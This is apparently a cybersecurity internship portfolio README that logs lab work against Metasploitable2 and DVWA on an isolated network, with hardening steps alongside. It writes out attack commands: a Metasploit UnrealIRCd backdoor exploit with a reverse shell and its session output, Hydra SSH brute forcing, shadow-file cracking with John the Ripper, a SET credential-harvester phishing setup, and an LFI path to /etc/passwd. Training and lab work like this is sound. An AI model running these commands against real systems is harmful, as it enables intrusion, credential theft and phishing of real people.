# 🛡️ ApexPlanet Cybersecurity Internship Portfolio
**Internship ID:** `APSPL2631283`  
**Engineer:** Fatimah Adnan  
**Repository Access:** [github.com/fatimahadnan230](https://github.com/fatimahadnan230)

---

## 📌 Executive Summary & Dashboard
This repository serves as the definitive technical portfolio for the ApexPlanet Cybersecurity & Ethical Hacking Internship Program. It contains all documentation, exploitation walkthroughs, mitigation strategies, and system configurations compiled over the 60-day curriculum lifecycle. 

```text
[Task 1: Foundations] ──> [Task 2: Recon & Traffic] ──> [Task 3: Web App Sec] ──> [Task 4: Exploits & Hardening] ──> [Task 5: Capstone/IR]
```

---

## 📂 Complete Repository Mapping Blueprint

### 🔍 Folder Path: `screenshots/01-recon-scanning/`
* `ifconfig.png` -> Target IP verification showing host machine configuration at `192.168.56.102`.
* `db_status.png` -> Metasploit console log verification confirming an active PostgreSQL backend connection state.
* `db_nmap.png` -> Aggressive network service discovery data sweep output displaying all target ports.
* `wireshark_ftp.png` -> Intercepted network packet stream capturing raw, plaintext credentials from unencrypted FTP traffic.

### 💥 Folder Path: `screenshots/02-exploitation/`
* `exploit_config.png` -> Metasploit console interface logging module configuration options for the UnrealIRCd backdoor.
* `shell_trigger.png` -> Active reverse shell payload execution buffer showing interactive system access.
* `whoami_root.png` -> Post-exploitation privilege audit terminal output validating direct `root` context access.
* `hydra_ssh.png` -> Hydra utility console interface actively brute-forcing administrative OpenSSH credentials on port 22.
* `john_cracked.png` -> John the Ripper security utility displaying decrypted shadow accounts in plaintext.

### 🎣 Folder Path: `screenshots/03-social-engineering/`
* `set_setup.png` -> Social-Engineer Toolkit interactive credential harvester menu selection path routing.
* `cloned_login.png` -> Intercepted plaintext parameters captured dynamically by the cloned enterprise portal login template.

### 🧪 Folder Path: `screenshots/04-malware-analysis/`
* `static_strings.png` -> Clean static printable character indicators pulled directly from the target system binary file.
* `dynamic_strace.png` -> Live runtime kernel system call traces generated step-by-step via `strace`.

### 🛡️ Folder Path: `screenshots/05-system-hardening/`
* `ufw_status.png` -> Host firewall policy layout showing active zero-trust rules filtering inbound connections.
* `service_disabled.png` -> Systemd manager service verification records showing the target service stopped, disabled, and masked.

---

# 🔬 Technical Lab Log Analysis (Tasks 1–4)

## 📡 Task 1: Foundations of Cybersecurity & Environment Setup
**Timeline:** Days 1–12  
**Core Objective:** Establish a secure, isolated virtualization architecture to safely conduct technical labs without risk of production network spillover.

### 1. Lab Infrastructure Build
* Attacker machine deployed using a specialized **Kali Linux** instance.
* Target virtualization components built using **Metasploitable2** and **DVWA (Damn Vulnerable Web App)** containers.
* Network boundaries strictly restricted using a **Host-Only Networking Adapter** configuration, fully decoupling the workspace from the WAN.

### 2. Core Linux & Networking Verification
Commands executed to verify system orientation, permissions auditing, and baseline local network mapping:
```bash
# Verify network adapters and internal sandbox routing
ifconfig
ping -c 3 192.168.56.102

# Check listening network connections and interface status
netstat -tulpn

# Review file security permissions configuration
pwd
ls -la
```

---

## 🔍 Task 2: Network Security, Scanning & Traffic Analysis
**Timeline:** Days 13–24  
**Core Objective:** Conduct detailed network-level reconnaissance, evaluate service banners, map target vulnerabilities, and intercept unencrypted transit protocols.

### 1. Persistent Database Recon Logging
```bash
# Initialize and verify local tracking infrastructure
msfdb init
msfconsole
db_status
```
* **Expected Indicator:** `[ * ] postgresql connected to msf`

### 2. Scanning & Target Operating System Mapping
```bash
# Run aggressive service version mapping, OS detection, and speed configurations
db_nmap -sV -O -T4 192.168.56.102
```
* **Phase Diagnostics Summary:** The comprehensive scan uncovered **twenty-three open TCP ports**, revealing an outdated, vulnerable patch baseline across common network services like `vsftpd`, `OpenSSH`, and `UnrealIRCd`.

### 3. Packet Sniffing & Traffic Interception (Wireshark / Netcat)
* Packet collection loops were set up to capture live protocols. 
* By filtering plaintext transit payloads, administrative credentials were systematically extracted from insecure FTP authentication requests.
* **SYN Flood Simulation Analysis:** Run vectors were simulated via `hping3` to review packet flood behaviors inside the capture logs.

### 4. Basic Network Perimeter Defense
```bash
# Establish host-level firewall rules to block unauthorized sweeps
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -A INPUT -p tcp -s 192.168.56.101 --syn -j DROP
```

---

## 💻 Task 3: Web Application Security (OWASP Top 10 Labs)
**Timeline:** Days 25–36  
**Core Objective:** Identify, exploit, and remediate high-severity web software flaws inside the DVWA architecture.

### 1. SQL Injection (SQLi)
* **Exploitation:** Injected raw parameters into vulnerable forms to break back-end SQL query parsing logic, enabling arbitrary enumeration of structural database tables.
* **Target Schema Extraction:** Successfully extracted user index lists, parsing usernames and corresponding password hashes for profiles like `admin` and `Gordon Brown`.
* **Mitigation Strategy:** Re-engineered backend queries to use **Prepared Statements (Parameterized Queries)** to ensure input parameters are never executed as active commands.

### 2. Cross-Site Scripting (XSS)
* **Stored XSS:** Injected arbitrary JavaScript structures directly into persistent database entry fields (e.g., guestbooks), forcing execution every time a visitor loads the page.
* **Reflected XSS:** Crafted query links carrying script strings that echo execution dynamically off the application interface.
* **Mitigation Strategy:** Implemented strict contextual context output encoding, rigorous input white-list validation, and an explicit **Content Security Policy (CSP)**.

### 3. Cross-Site Request Forgery (CSRF)
* **Exploitation:** Built an external page template that systematically triggers unauthorized administrative actions (e.g., silent password resets) on the target DVWA session via cookie-carrying requests.
* **Mitigation Strategy:** Integrated unique, cryptographic **Anti-CSRF Tokens** validated tracking on every state-changing state operation.

### 4. File Inclusion Attacks (LFI/RFI)
* **Local File Inclusion (LFI):** Manipulated path variables to bypass directory bounds, reading restricted server configuration layers (e.g., `../../../../etc/passwd`).
* **Remote File Inclusion (RFI):** Passed web addresses to inject and execute remote web code payloads inside the local host engine execution stream.

### 5. Burp Suite Proxy Optimization
* Traffic interceptions were routed through a local loopback proxy (`127.0.0.1:8080`) to capture raw HTTP requests. 
* **Fuzzing Campaigns:** Used **Burp Suite Intruder** to map credential submission endpoints, analyzing response sizes and status flags to locate valid logins.

### 6. Security Header Implementations
* Configured target web service configuration profiles to implement defensive HTTP response headers:
```apache
# Appended to Apache configuration layers
Header set X-Frame-Options "DENY"
Header set X-Content-Type-Options "nosniff"
Header set Content-Security-Policy "default-src 'self';"
```
* Verified using syntax checking flags: `apachectl configtest`.

---

## 🔓 Task 4: Exploitation & System Security Hardening
**Timeline:** Days 37–48  
**Core Objective:** Execute full-chain exploitation paths responsibly, perform endpoint account cracking, run behavior diagnostics, and apply host-level defensive baselines.

### 1. Metasploit Exploitation Flow (UnrealIRCd Backdoor)
```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.102
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.56.101
exploit
```
* **Session Capture Output:**
```text
[ * ] 192.168.56.102:6667 - Connected to the IRC server...
[ * ] 192.168.56.102:6667 - Sending backdoor command execution payload...
[ * ] Accepted reverse connection from 192.168.56.102
[ * ] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.102:49211)
```
* **Post-Exploitation Privilege Verification:**
```bash
whoami
# Returns: root
id
# Returns: uid=0(root) gid=0(root)
```

### 2. Password Audits & Account Cryptanalysis
* **Online Attack Simulation:** Armed brute forcing parameters with **Hydra** against active SSH services:
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102 -t 4
```
* **Offline Cracking Flow:** Extracted storage files (`/etc/passwd` and `/etc/shadow`), unshared the indices, and executed high-speed wordlist mutations using **John the Ripper**:
```bash
unshadow /tmp/target_passwd /tmp/target_shadow > /tmp/target_hashes
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/target_hashes
```

### 3. Phishing Simulation (Social Engineering)
* Initiated the framework with `sudo setoolkit`. 
* Routed configuration menus through: `Social Engineering Attacks` -> `Website Attack Vectors` -> `Credential Harvester Attack Method` -> `Site Cloner`.
* Configured local proxy bindings to listen on `192.168.56.101` and cloned the targeted employee gateway portal.
* Captured plaintext exfiltrated form submission objects:
```text
PARAM: username=test_employee@apexplanet.com
PARAM: password=UnsecurePassword123!
```

### 4. Behavioral Binary Diagnostics (Malware Analysis Baseline)
* Evaluated standard executions inside an isolated sandbox to map safe application baselines.
* **Static Examination:** Checked internal dependencies and string structure:
```bash
strings /usr/bin/whoami
```
* **Dynamic Trace Logging:** Monitored low-level system call execution parameters at runtime using `strace`:
```bash
strace whoami
```
* **Captured Trace Sequence:**
```text
execve("/usr/bin/whoami", ["whoami"], 0x7ffe6bfa...) = 0
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
mmap(NULL, 83921, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f3941b2c000
write(1, "root\n", 5) = 5
exit_group(0) = ?
```

### 5. Defensive Host Infrastructure Hardening
* Applied network boundary access control structures to filter raw interfaces:
```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw allow 80/tcp
sudo ufw enable
```
* Audited application attack surface by identifying, stopping, disabling, and permanently masking legacy background services:
```bash
# Locate active targets
systemctl list-unit-files --state=enabled | grep Modem
# Systematically lock down service activation hooks
sudo systemctl stop ModemManager
sudo systemctl disable ModemManager
sudo systemctl mask ModemManager
```

---
